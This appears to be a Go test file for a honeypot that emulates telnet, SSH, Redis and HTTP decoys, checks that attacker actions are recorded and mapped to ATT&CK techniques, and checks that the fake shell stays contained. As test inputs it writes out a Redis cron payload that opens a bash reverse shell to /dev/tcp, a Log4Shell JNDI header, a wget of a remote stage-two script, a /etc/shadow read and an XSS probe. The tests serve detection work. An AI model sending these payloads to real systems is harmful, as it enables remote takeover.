package honeyd

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log/slog"
	"net"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"

	"github.com/sauron666/Honeypot/internal/event"
)

// collector records everything the farm emits so tests can assert on evidence
// rather than on side effects.
type collector struct {
	mu     sync.Mutex
	events []*event.Event
}

func (c *collector) Emit(_ context.Context, e *event.Event) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.events = append(c.events, e)
}

func (c *collector) all() []*event.Event {
	c.mu.Lock()
	defer c.mu.Unlock()
	return append([]*event.Event(nil), c.events...)
}

// waitFor polls until pred is satisfied, so tests do not race the async farm.
func (c *collector) waitFor(t *testing.T, what string, pred func(*event.Event) bool) *event.Event {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		for _, e := range c.all() {
			if pred(e) {
				return e
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
	var got []string
	for _, e := range c.all() {
		got = append(got, fmt.Sprintf("%s: %s", e.ClassUID, e.Message))
	}
	t.Fatalf("no event matching %s within timeout; saw:\n  %s", what, strings.Join(got, "\n  "))
	return nil
}

func hasData(key, want string) func(*event.Event) bool {
	return func(e *event.Event) bool { return e.GetString(key) == want }
}

// startFarm boots a farm on ephemeral ports and returns it with its collector.
func startFarm(t *testing.T, listeners ...ListenerConfig) (*Server, *collector, map[string]string) {
	t.Helper()
	col := &collector{}
	for i := range listeners {
		if listeners[i].Persona == "" {
			listeners[i].Persona = "linux/web"
		}
		// Port 0 asks the kernel for a free one. Callers that need a stable
		// port -- reconcile tests, which must be able to name the same
		// endpoint twice -- pass an explicit one.
	}
	cfg := Config{
		Identity:   Identity{TenantID: "test", SiteID: "site", DecoyID: "dcy_test"},
		DeploySeed: "test-seed-fixed",
		BindAddr:   "127.0.0.1",
		Listeners:  listeners,
	}
	srv, err := NewServer(cfg, col, nil, slog.New(slog.DiscardHandler))
	if err != nil {
		t.Fatalf("NewServer: %v", err)
	}
	if err := srv.Start(context.Background()); err != nil {
		t.Fatalf("Start: %v", err)
	}
	t.Cleanup(func() { srv.Close() })

	addrs := srv.Addrs()
	byService := map[string]string{}
	for i, l := range listeners {
		byService[l.Service] = addrs[i]
	}
	return srv, col, byService
}

func TestTelnetLoginAndShellProduceEvidence(t *testing.T) {
	_, col, addrs := startFarm(t, ListenerConfig{Service: "telnet"})

	conn, err := net.Dial("tcp", addrs["telnet"])
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(20 * time.Second))
	r := bufio.NewReader(conn)

	readUntil(t, r, "login:")
	fmt.Fprintf(conn, "root\r\n")
	readUntil(t, r, "Password:")
	// "toor" is one of the persona's planted weak passwords.
	fmt.Fprintf(conn, "toor\r\n")
	readUntil(t, r, "root@")

	fmt.Fprintf(conn, "cat /etc/shadow\r\n")
	readUntil(t, r, "root:$6$")

	cred := col.waitFor(t, "accepted credential", func(e *event.Event) bool {
		return e.ClassUID == event.ClassCredentialOffer && e.GetString("username") == "root"
	})
	if v, _ := cred.Get("accepted"); v != true {
		t.Fatalf("credential should have been accepted: %+v", cred.Data)
	}
	if cred.GetString("secret") != "toor" {
		t.Fatalf("captured secret = %q, want toor", cred.GetString("secret"))
	}

	// Reading /etc/shadow must be recorded as credential access, not as a
	// generic file read: this is the mapping an analyst acts on.
	read := col.waitFor(t, "shadow read", func(e *event.Event) bool {
		return e.ClassUID == event.ClassFileActivity && e.GetString("file_path") == "/etc/shadow"
	})
	if !hasTechnique(read, "T1003.008") {
		t.Fatalf("shadow read not mapped to T1003.008: %+v", read.Mirage.Attack)
	}
	if read.SeverityID < event.SeverityHigh {
		t.Fatalf("shadow read severity = %s, want at least high", read.SeverityID)
	}
}

func TestTelnetRejectsWrongPasswordAndRecordsIt(t *testing.T) {
	_, col, addrs := startFarm(t, ListenerConfig{Service: "telnet"})

	conn, err := net.Dial("tcp", addrs["telnet"])
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(20 * time.Second))
	r := bufio.NewReader(conn)

	readUntil(t, r, "login:")
	fmt.Fprintf(conn, "admin\r\n")
	readUntil(t, r, "Password:")
	fmt.Fprintf(conn, "definitely-not-the-password\r\n")
	readUntil(t, r, "Login incorrect")

	e := col.waitFor(t, "rejected credential", func(e *event.Event) bool {
		return e.ClassUID == event.ClassCredentialOffer && e.GetString("username") == "admin"
	})
	if v, _ := e.Get("accepted"); v != false {
		t.Fatal("wrong password must be recorded as not accepted")
	}
}

func TestShellNeverReachesTheNetwork(t *testing.T) {
	// Containment: a decoy that can be used as a jump box or a downloader is a
	// liability. The shell must answer plausibly and emit an IOC, without ever
	// opening a socket.
	p, _ := BuildPersona("linux/web", "seed")
	col := &collector{}
	s := newTestSession(p, col)
	sh := NewShell(p, s, "root")

	out, _ := sh.Execute("wget http://198.51.100.66/stage2.sh -O /tmp/x")
	if !strings.Contains(out, "unable to resolve") && !strings.Contains(out, "failed") {
		t.Fatalf("wget answer should look like a network failure, got %q", out)
	}
	if got := sh.Downloads(); len(got) != 1 || got[0] != "http://198.51.100.66/stage2.sh" {
		t.Fatalf("payload URL not captured: %v", got)
	}
	col.waitFor(t, "ingress tool transfer IOC", func(e *event.Event) bool {
		return e.GetString("ioc_type") == "url" && hasTechnique(e, "T1105")
	})

	out, _ = sh.Execute("ssh backup@10.10.0.55")
	if !strings.Contains(out, "timed out") {
		t.Fatalf("outbound ssh should look like a timeout, got %q", out)
	}
	blocked := col.waitFor(t, "blocked outbound", func(e *event.Event) bool {
		v, _ := e.Get("blocked")
		return v == true
	})
	if !strings.Contains(blocked.GetString("reason"), "containment") {
		t.Fatalf("blocked event should cite containment: %+v", blocked.Data)
	}
}

func TestShellHoneytokenReadIsCritical(t *testing.T) {
	p, _ := BuildPersona("linux/web", "seed")
	col := &collector{}
	s := newTestSession(p, col)
	sh := NewShell(p, s, "root")

	out, _ := sh.Execute("cat /var/www/html/.env")
	if !strings.Contains(out, "DB_PASSWORD=") {
		t.Fatalf(".env should contain planted credentials, got %q", out)
	}
	e := col.waitFor(t, "honeytoken read", func(e *event.Event) bool {
		return e.GetString("honeytoken") == "app-db-credential"
	})
	if e.SeverityID != event.SeverityCritical {
		t.Fatalf("honeytoken read severity = %s, want critical", e.SeverityID)
	}
}

func TestShellFilesystemBehavesLikeAShell(t *testing.T) {
	p, _ := BuildPersona("linux/web", "seed")
	sh := NewShell(p, newTestSession(p, &collector{}), "root")

	if out, _ := sh.Execute("pwd"); strings.TrimSpace(out) != "/root" {
		t.Fatalf("pwd = %q, want /root", out)
	}
	if out, _ := sh.Execute("cd /etc"); out != "" {
		t.Fatalf("cd to a real directory should be silent, got %q", out)
	}
	if out, _ := sh.Execute("pwd"); strings.TrimSpace(out) != "/etc" {
		t.Fatalf("cd did not change directory: %q", out)
	}
	if out, _ := sh.Execute("cd /nope"); !strings.Contains(out, "No such file or directory") {
		t.Fatalf("cd to a missing directory should fail, got %q", out)
	}
	if out, _ := sh.Execute("cat /etc/hostname"); strings.TrimSpace(out) != p.Hostname {
		t.Fatalf("hostname = %q, want %q", out, p.Hostname)
	}
	if out, _ := sh.Execute("cat /etc/nope"); !strings.Contains(out, "No such file") {
		t.Fatalf("missing file should error, got %q", out)
	}
	if out, _ := sh.Execute("nosuchcommand"); !strings.Contains(out, "command not found") {
		t.Fatalf("unknown command answer = %q", out)
	}
	if out, _ := sh.Execute("ls -la /"); !strings.Contains(out, "etc") || !strings.Contains(out, "drwx") {
		t.Fatalf("ls -la / looks wrong: %q", out)
	}
	if _, exit := sh.Execute("exit"); !exit {
		t.Fatal("exit must end the session")
	}
}

func TestShellCompoundCommandsAreExecutedAndRecorded(t *testing.T) {
	p, _ := BuildPersona("linux/web", "seed")
	col := &collector{}
	sh := NewShell(p, newTestSession(p, col), "root")

	out, _ := sh.Execute("whoami; uname -a && cat /etc/passwd")

	// Every part must actually run, so the attacker sees a believable answer.
	for _, want := range []string{"root", "Linux " + p.Hostname, "www-data"} {
		if !strings.Contains(out, want) {
			t.Errorf("compound output missing %q; got:\n%s", want, out)
		}
	}
	// The recorded command is the line as typed -- that is what an analyst
	// needs to see -- and side effects inside it are recorded separately.
	col.waitFor(t, "full command line recorded", func(e *event.Event) bool {
		return e.GetString("command") == "whoami; uname -a && cat /etc/passwd"
	})
	col.waitFor(t, "passwd read inside compound command", func(e *event.Event) bool {
		return e.GetString("file_path") == "/etc/passwd"
	})
}

func TestRedisRCEChainIsCaptured(t *testing.T) {
	_, col, addrs := startFarm(t, ListenerConfig{Service: "redis"})

	conn, err := net.Dial("tcp", addrs["redis"])
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(20 * time.Second))
	r := bufio.NewReader(conn)

	send := func(cmd string) string {
		fmt.Fprintf(conn, "%s\r\n", cmd)
		line, err := r.ReadString('\n')
		if err != nil {
			t.Fatalf("read after %q: %v", cmd, err)
		}
		return line
	}
	if got := send("PING"); !strings.HasPrefix(got, "+PONG") {
		t.Fatalf("PING = %q", got)
	}
	// The canonical Redis takeover: point the dump at cron, stage a payload,
	// then save. Each step must be recorded, and SAVE must carry the payload.
	send("CONFIG SET dir /var/spool/cron")
	send("CONFIG SET dbfilename root")
	send(`SET pwn "\n\n* * * * * bash -i >& /dev/tcp/198.51.100.9/4444 0>&1\n\n"`)
	send("SAVE")

	col.waitFor(t, "CONFIG SET dir finding", func(e *event.Event) bool {
		return e.GetString("config_key") == "dir" && e.GetString("config_value") == "/var/spool/cron"
	})
	col.waitFor(t, "staged cron payload", hasData("payload_kind", "cron-reverse-shell"))
	save := col.waitFor(t, "persistence write", func(e *event.Event) bool {
		return e.GetString("redis_dir") == "/var/spool/cron"
	})
	if save.SeverityID != event.SeverityCritical {
		t.Fatalf("redis SAVE severity = %s, want critical", save.SeverityID)
	}
	if !strings.Contains(save.GetString("payload_pwn"), "dev/tcp") {
		t.Fatalf("SAVE event must carry the staged payload, got %q", save.GetString("payload_pwn"))
	}
}

func TestHTTPScannerAndExploitDetection(t *testing.T) {
	_, col, addrs := startFarm(t, ListenerConfig{Service: "http"})
	base := "http://" + addrs["http"]
	client := &http.Client{Timeout: 10 * time.Second}

	// A request for a file with no legitimate reason to exist.
	resp, err := client.Get(base + "/.env")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	e := col.waitFor(t, "scanner path finding", func(e *event.Event) bool {
		return e.GetString("url_path") == "/.env" && e.ClassUID == event.ClassDetectionFinding
	})
	if e.SeverityID < event.SeverityHigh {
		t.Fatalf("scanner path severity = %s, want at least high", e.SeverityID)
	}

	// Log4Shell in a header, which is where it actually arrives.
	req, _ := http.NewRequest("GET", base+"/", nil)
	req.Header.Set("User-Agent", "${jndi:ldap://198.51.100.5:1389/a}")
	resp, err = client.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	l4 := col.waitFor(t, "log4shell finding", func(e *event.Event) bool {
		return strings.Contains(e.Message, "log4shell")
	})
	if l4.SeverityID != event.SeverityCritical {
		t.Fatalf("log4shell severity = %s, want critical", l4.SeverityID)
	}

	// Credentials posted to the portal.
	resp, err = client.PostForm(base+"/login", map[string][]string{
		"username": {"administrator"}, "password": {"Winter2025!"},
	})
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	cred := col.waitFor(t, "http form credential", func(e *event.Event) bool {
		return e.ClassUID == event.ClassCredentialOffer && e.GetString("auth_method") == "http-form"
	})
	if cred.GetString("secret") != "Winter2025!" {
		t.Fatalf("captured password = %q", cred.GetString("secret"))
	}
}

func TestHTTPPortalDoesNotReflectInput(t *testing.T) {
	// Our own decoy must not be the XSS the attacker was hunting for.
	_, _, addrs := startFarm(t, ListenerConfig{Service: "http"})
	resp, err := http.Get("http://" + addrs["http"] + "/<script>alert(1)</script>")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if strings.Contains(string(body), "<script>alert(1)</script>") {
		t.Fatal("decoy reflected unescaped input into its 404 page")
	}
}

func TestSSHLoginExecAndFingerprinting(t *testing.T) {
	_, col, addrs := startFarm(t, ListenerConfig{
		Service: "ssh", Persona: "linux/db",
		Options: map[string]any{"host_key_path": t.TempDir()},
	})

	client, err := ssh.Dial("tcp", addrs["ssh"], &ssh.ClientConfig{
		User:            "dba",
		Auth:            []ssh.AuthMethod{ssh.Password("dba123")},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	})
	if err != nil {
		t.Fatalf("ssh dial: %v", err)
	}
	defer client.Close()

	sess, err := client.NewSession()
	if err != nil {
		t.Fatal(err)
	}
	defer sess.Close()

	out, err := sess.Output("cat /etc/mysql/my.cnf")
	if err != nil {
		t.Fatalf("exec: %v", err)
	}
	if !strings.Contains(string(out), "password=") {
		t.Fatalf("my.cnf should contain the planted credential, got %q", out)
	}

	auth := col.waitFor(t, "ssh auth success", func(e *event.Event) bool {
		return e.ClassUID == event.ClassAuthentication
	})
	if auth.GetString("username") != "dba" {
		t.Fatalf("authenticated user = %q", auth.GetString("username"))
	}
	// Client fingerprinting: attackers rotate IPs, not tooling.
	if auth.GetString("client_tool") == "" || auth.GetString("client_version") == "" {
		t.Fatalf("client fingerprint missing: %+v", auth.Data)
	}
	col.waitFor(t, "exec command", func(e *event.Event) bool {
		return e.ClassUID == event.ClassCommandExecuted &&
			strings.Contains(e.GetString("command"), "my.cnf")
	})
	col.waitFor(t, "honeytoken read over ssh", hasData("honeytoken", "mysql-root-credential"))
}

func TestSSHWrongPasswordIsRecordedAndRejected(t *testing.T) {
	_, col, addrs := startFarm(t, ListenerConfig{
		Service: "ssh", Options: map[string]any{"host_key_path": t.TempDir()},
	})
	_, err := ssh.Dial("tcp", addrs["ssh"], &ssh.ClientConfig{
		User:            "nobody",
		Auth:            []ssh.AuthMethod{ssh.Password("wrong-1")},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	})
	if err == nil {
		t.Fatal("a single wrong password must not authenticate")
	}
	e := col.waitFor(t, "rejected ssh credential", func(e *event.Event) bool {
		return e.ClassUID == event.ClassCredentialOffer && e.GetString("username") == "nobody"
	})
	if v, _ := e.Get("accepted"); v != false {
		t.Fatal("wrong password recorded as accepted")
	}
}

func TestSSHHostKeyIsStableAcrossRestarts(t *testing.T) {
	// A host key that changes on restart is one of the clearest honeypot
	// tells there is, and it makes real clients refuse to connect.
	dir := t.TempDir()
	fingerprint := func() string {
		_, _, addrs := startFarm(t, ListenerConfig{
			Service: "ssh", Options: map[string]any{"host_key_path": dir},
		})
		var fp string
		_, err := ssh.Dial("tcp", addrs["ssh"], &ssh.ClientConfig{
			User: "x", Auth: []ssh.AuthMethod{ssh.Password("y")},
			HostKeyCallback: func(_ string, _ net.Addr, key ssh.PublicKey) error {
				fp = ssh.FingerprintSHA256(key)
				return nil
			},
			Timeout: 10 * time.Second,
		})
		if err == nil {
			t.Fatal("expected auth failure while collecting the host key")
		}
		return fp
	}
	first, second := fingerprint(), fingerprint()
	if first == "" || first != second {
		t.Fatalf("host key changed between restarts: %q vs %q", first, second)
	}
}

func TestGenericServiceRecordsScanAndPayload(t *testing.T) {
	_, col, addrs := startFarm(t, ListenerConfig{
		Service: "generic", Options: map[string]any{"name": "mssql", "banner": ""},
	})

	// Connect and send nothing: a port scan.
	c1, err := net.Dial("tcp", addrs["generic"])
	if err != nil {
		t.Fatal(err)
	}
	c1.Close()
	col.waitFor(t, "port scan event", func(e *event.Event) bool {
		return strings.Contains(e.Message, "port scan")
	})

	// Connect and send something: a payload.
	c2, err := net.Dial("tcp", addrs["generic"])
	if err != nil {
		t.Fatal(err)
	}
	c2.Write([]byte("\x12\x01\x00\x34EXPLOIT-PROBE"))
	c2.Close()
	e := col.waitFor(t, "payload event", func(e *event.Event) bool {
		return strings.Contains(e.GetString("payload_ascii"), "EXPLOIT-PROBE")
	})
	if e.GetString("payload_hex") == "" {
		t.Fatal("payload must be recorded in hex as well as ascii")
	}
}

func TestPerSourceConnectionLimit(t *testing.T) {
	col := &collector{}
	cfg := Config{
		Identity:      Identity{TenantID: "t", SiteID: "s", DecoyID: "d"},
		BindAddr:      "127.0.0.1",
		MaxConnsPerIP: 2,
		Listeners:     []ListenerConfig{{Service: "telnet", Persona: "linux/web", Port: 0}},
	}
	srv, err := NewServer(cfg, col, nil, slog.New(slog.DiscardHandler))
	if err != nil {
		t.Fatal(err)
	}
	if err := srv.Start(context.Background()); err != nil {
		t.Fatal(err)
	}
	defer srv.Close()
	addr := srv.Addrs()[0]

	var held []net.Conn
	defer func() {
		for _, c := range held {
			c.Close()
		}
	}()
	for i := 0; i < 5; i++ {
		c, err := net.Dial("tcp", addr)
		if err != nil {
			continue
		}
		held = append(held, c)
	}
	// The limit must be enforced and, importantly, recorded: shedding load
	// silently would hide the fact that a decoy is being hammered.
	col.waitFor(t, "containment event for connection limit", func(e *event.Event) bool {
		return e.ClassUID == event.ClassContainment
	})
}

func TestUnknownServiceAndPersonaFailAtStartup(t *testing.T) {
	col := &collector{}
	base := Config{Identity: Identity{TenantID: "t", SiteID: "s"}, BindAddr: "127.0.0.1"}

	cfg := base
	cfg.Listeners = []ListenerConfig{{Service: "gopher", Persona: "linux/web"}}
	if _, err := NewServer(cfg, col, nil, slog.New(slog.DiscardHandler)); err == nil {
		t.Fatal("unknown service must be rejected at startup, not at first connection")
	}

	cfg = base
	cfg.Listeners = []ListenerConfig{{Service: "telnet", Persona: "macos/laptop"}}
	if _, err := NewServer(cfg, col, nil, slog.New(slog.DiscardHandler)); err == nil {
		t.Fatal("unknown persona must be rejected at startup")
	}
}

func TestPersonaIsStableForASeedAndDiffersBetweenSeeds(t *testing.T) {
	a1, _ := BuildPersona("linux/web", "deployment-A")
	a2, _ := BuildPersona("linux/web", "deployment-A")
	b, _ := BuildPersona("linux/web", "deployment-B")

	if a1.Hostname != a2.Hostname {
		t.Fatal("the same seed must produce the same decoy across restarts")
	}
	env1, _ := a1.FS.Lookup("/var/www/html/.env")
	env2, _ := a2.FS.Lookup("/var/www/html/.env")
	if env1.Content != env2.Content {
		t.Fatal("planted content must be stable for a seed")
	}
	envB, _ := b.FS.Lookup("/var/www/html/.env")
	if envB.Content == env1.Content {
		t.Fatal("two deployments must not share planted secrets: that is a signature")
	}
}

func TestPersonaLooksLivedIn(t *testing.T) {
	// The most reliable honeypot tell is a machine with no history.
	p, _ := BuildPersona("linux/web", "seed")
	if time.Since(p.BootTime) < 30*24*time.Hour {
		t.Fatalf("decoy uptime is %s; real servers have been up for months", time.Since(p.BootTime))
	}
	hist, ok := p.FS.Lookup("/root/.bash_history")
	if !ok || len(hist.Content) < 50 {
		t.Fatal("a decoy with an empty shell history is obviously fake")
	}
	logf, ok := p.FS.Lookup("/var/log/nginx/access.log")
	if !ok || strings.Count(logf.Content, "\n") < 20 {
		t.Fatal("a decoy with an empty access log is obviously fake")
	}
	for _, f := range []string{"/etc/passwd", "/etc/hosts", "/etc/fstab", "/etc/os-release", "/proc/version"} {
		if _, ok := p.FS.Lookup(f); !ok {
			t.Errorf("missing %s: any recon script checks it", f)
		}
	}
}

func newTestSession(p *Persona, col *collector) *Session {
	return &Session{
		ID: "ses_test", Service: "test",
		Identity:  Identity{TenantID: "t", SiteID: "s", DecoyID: "d", Persona: p.Name},
		Remote:    &net.TCPAddr{IP: net.ParseIP("198.51.100.7"), Port: 4444},
		Local:     &net.TCPAddr{IP: net.ParseIP("10.66.0.10"), Port: 22},
		Started:   time.Now(),
		Persona:   p,
		emitter:   col,
		ctx:       context.Background(),
		maxScript: 65536,
	}
}

func hasTechnique(e *event.Event, id string) bool {
	for _, t := range e.Mirage.Attack {
		if t.Technique == id {
			return true
		}
	}
	return false
}

func readUntil(t *testing.T, r *bufio.Reader, want string) string {
	t.Helper()
	var sb strings.Builder
	deadline := time.Now().Add(15 * time.Second)
	buf := make([]byte, 1)
	for time.Now().Before(deadline) {
		n, err := r.Read(buf)
		if n > 0 {
			sb.WriteByte(buf[0])
			if strings.Contains(sb.String(), want) {
				return sb.String()
			}
		}
		if err != nil {
			t.Fatalf("read while waiting for %q: %v (got %q)", want, err, sb.String())
		}
	}
	t.Fatalf("timed out waiting for %q, got %q", want, sb.String())
	return ""
}

func TestReconcileAddsAndRemovesWithoutDisturbingTheRest(t *testing.T) {
	telnetPort, redisPort, httpPort := freeTestPort(t), freeTestPort(t), freeTestPort(t)
	srv, col, _ := startFarm(t,
		ListenerConfig{Service: "telnet", Persona: "linux/web", DecoyID: "dcy-a", Port: telnetPort},
		ListenerConfig{Service: "redis", Persona: "linux/db", DecoyID: "dcy-b", Port: redisPort},
	)
	before := srv.Bound()
	if len(before) != 2 {
		t.Fatalf("expected two endpoints, got %d", len(before))
	}
	var telnetAddr, redisAddr string
	for _, b := range before {
		switch b.Service {
		case "telnet":
			telnetAddr = b.Address
		case "redis":
			redisAddr = b.Address
		}
	}

	// Keep telnet exactly as it is, drop redis, add http.
	desired := []ListenerConfig{
		{Service: "telnet", Persona: "linux/web", DecoyID: "dcy-a", Port: telnetPort},
		{Service: "http", Persona: "linux/web", DecoyID: "dcy-a", Port: httpPort},
	}
	added, removed, err := srv.Reconcile(desired)
	if err != nil {
		t.Fatalf("reconcile: %v", err)
	}
	if len(added) != 1 || len(removed) != 1 {
		t.Fatalf("added=%v removed=%v", added, removed)
	}

	// The untouched endpoint must still be serving: an attacker mid-engagement
	// would notice a decoy that blinked.
	conn, err := net.Dial("tcp", telnetAddr)
	if err != nil {
		t.Fatalf("the unchanged telnet decoy stopped answering: %v", err)
	}
	conn.Close()

	// The removed endpoint must stop accepting.
	if c, err := net.Dial("tcp", redisAddr); err == nil {
		c.Close()
		t.Fatal("the removed redis decoy is still accepting connections")
	}

	// And the new one must work end to end.
	var httpAddr string
	for _, b := range srv.Bound() {
		if b.Service == "http" {
			httpAddr = b.Address
		}
	}
	if httpAddr == "" {
		t.Fatal("the added http decoy is not bound")
	}
	resp, err := http.Get("http://" + httpAddr + "/.env")
	if err != nil {
		t.Fatalf("the added decoy does not answer: %v", err)
	}
	resp.Body.Close()
	col.waitFor(t, "evidence from the newly added decoy", func(e *event.Event) bool {
		return e.GetString("url_path") == "/.env"
	})
}

func TestReconcileRejectsABadManifestWithoutChangingAnything(t *testing.T) {
	port := freeTestPort(t)
	srv, _, _ := startFarm(t,
		ListenerConfig{Service: "telnet", Persona: "linux/web", DecoyID: "dcy-a", Port: port})
	before := srv.Bound()

	_, _, err := srv.Reconcile([]ListenerConfig{
		{Service: "telnet", Persona: "linux/web", DecoyID: "dcy-a", Port: port},
		{Service: "gopher", Persona: "linux/web", DecoyID: "dcy-x", Port: freeTestPort(t)},
	})
	if err == nil {
		t.Fatal("an unknown service must be rejected")
	}
	// A manifest with a typo must not leave the farm half-applied.
	after := srv.Bound()
	if len(after) != len(before) || after[0].Address != before[0].Address {
		t.Fatalf("the farm changed despite a rejected manifest: %v -> %v", before, after)
	}
}

// freeTestPort asks the kernel for an unused port and gives it straight back.
func freeTestPort(t *testing.T) int {
	t.Helper()
	l, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer l.Close()
	_, port, _ := net.SplitHostPort(l.Addr().String())
	n, err := strconv.Atoi(port)
	if err != nil {
		t.Fatal(err)
	}
	return n
}

func TestReconcileRebindsWhenTheIdentityChanges(t *testing.T) {
	// The same port serving a different persona is a different decoy. Leaving
	// the old one running while the plan says it changed is how a
	// deception-as-code tool becomes untrustworthy.
	port := freeTestPort(t)
	srv, _, _ := startFarm(t,
		ListenerConfig{Service: "telnet", Persona: "linux/web", DecoyID: "dcy-old", Port: port})

	if got := srv.Bound()[0]; got.Persona != "linux/web" || got.DecoyID != "dcy-old" {
		t.Fatalf("unexpected initial state: %+v", got)
	}

	added, removed, err := srv.Reconcile([]ListenerConfig{
		{Service: "telnet", Persona: "linux/backup", DecoyID: "dcy-new", Port: port},
	})
	if err != nil {
		t.Fatalf("reconcile: %v", err)
	}
	if len(added) != 1 || len(removed) != 1 {
		t.Fatalf("a replace must show as one removal and one addition: added=%v removed=%v", added, removed)
	}

	bound := srv.Bound()
	if len(bound) != 1 {
		t.Fatalf("expected one endpoint, got %d", len(bound))
	}
	if bound[0].Persona != "linux/backup" || bound[0].DecoyID != "dcy-new" {
		t.Fatalf("the endpoint still carries the old identity: %+v", bound[0])
	}

	// And the new persona must actually be what answers.
	conn, err := net.Dial("tcp", bound[0].Address)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	r := bufio.NewReader(conn)
	banner := readUntil(t, r, "login:")
	// linux/backup announces Debian 11; linux/web announces Debian 12.
	if !strings.Contains(banner, "Debian GNU/Linux 11") {
		t.Fatalf("the old persona is still answering: %q", banner)
	}
}

func TestEveryPersonaLooksLivedIn(t *testing.T) {
	// This is a gate, not an observation. A decoy with no shell history and no
	// logs is the easiest kind to spot, and personas are added often enough
	// that "remember to add a history" is not a plan.
	for _, name := range PersonaNames() {
		t.Run(name, func(t *testing.T) {
			p, err := BuildPersona(name, "gate-seed")
			if err != nil {
				t.Fatal(err)
			}
			if days := time.Since(p.BootTime).Hours() / 24; days < 30 {
				t.Errorf("uptime is %.0f days; production hosts are up for months", days)
			}
			history, logs := p.Liveness()
			if history < 50 {
				t.Errorf("shell history is %d bytes: the first thing anyone reads after landing", history)
			}
			if logs < 20 {
				t.Errorf("only %d log lines: a real host accumulates thousands", logs)
			}
			if p.Hostname == "" || p.OSName == "" {
				t.Error("a persona without a hostname or an OS cannot answer basic recon")
			}
			if len(p.Users) == 0 {
				t.Error("a host with no accounts is not a host")
			}
		})
	}
}
